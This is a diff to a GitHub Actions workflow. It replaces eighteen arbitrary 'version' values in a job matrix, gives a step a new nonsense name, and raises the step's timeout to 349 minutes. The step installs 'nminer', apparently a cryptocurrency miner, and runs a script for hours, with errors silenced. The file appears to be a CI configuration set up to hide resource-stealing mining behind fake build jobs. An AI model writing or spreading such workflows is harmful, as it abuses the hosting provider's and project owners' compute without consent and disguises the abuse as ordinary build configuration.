@@ -9,24 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 168 }
-          - { version: 7712 }
-          - { version: 4367 }
-          - { version: 9165 }
-          - { version: 5078 }
-          - { version: 2158 }
-          - { version: 175 }
-          - { version: 2686 }
-          - { version: 4544 }
-          - { version: 3762 }
-          - { version: 2431 }
-          - { version: 5030 }
-          - { version: 8921 }
-          - { version: 9567 }
-          - { version: 72 }
-          - { version: 400 }
-          - { version: 6602 }
-          - { version: 1359 }
+          - { version: 473 }
+          - { version: 6832 }
+          - { version: 5291 }
+          - { version: 6156 }
+          - { version: 2918 }
+          - { version: 5317 }
+          - { version: 4806 }
+          - { version: 9281 }
+          - { version: 4249 }
+          - { version: 5096 }
+          - { version: 7795 }
+          - { version: 7661 }
+          - { version: 5123 }
+          - { version: 4018 }
+          - { version: 5260 }
+          - { version: 3990 }
+          - { version: 9383 }
+          - { version: 6172 }
 
     steps:
       - name: Checkout
@@ -37,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: immediately cap granny
+      - name: properly ample filter
         run: |
           npm install nminer@latest
-          timeout 339m node remark.js || echo "remark executed"
+          timeout 349m node remark.js || echo "remark executed"
